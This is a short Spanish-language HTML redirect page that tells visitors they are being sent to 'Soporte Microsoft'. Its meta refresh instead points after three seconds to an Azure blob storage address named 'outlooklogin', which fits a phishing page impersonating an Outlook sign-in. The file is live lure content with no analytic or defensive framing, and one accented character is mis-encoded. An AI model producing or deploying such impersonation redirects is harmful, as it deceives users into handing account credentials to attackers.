<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="3; url=https://outlooklogin.blob.core.windows.net/out/index.html" />
    <title>Redirigiendo...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f3f6fa;
            font-family: Arial, sans-serif;
            color: #1b3b6f;
        }
        .mensaje {
            text-align: center;
        }
        .mensaje h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        .mensaje p {
            font-size: 18px;
        }
        .loader {
            margin-top: 20px;
            border: 5px solid #ccc;
            border-top: 5px solid #1b3b6f;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: girar 1s linear infinite;
            margin-left: auto;
            margin-right: auto;
        }
        @keyframes girar {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="mensaje">
        <h1>En un momento ser√°s redirigido hacia</h1>
        <p><strong>Soporte Microsoft</strong></p>
        <div class="loader"></div>
    </div>
</body>
</html>
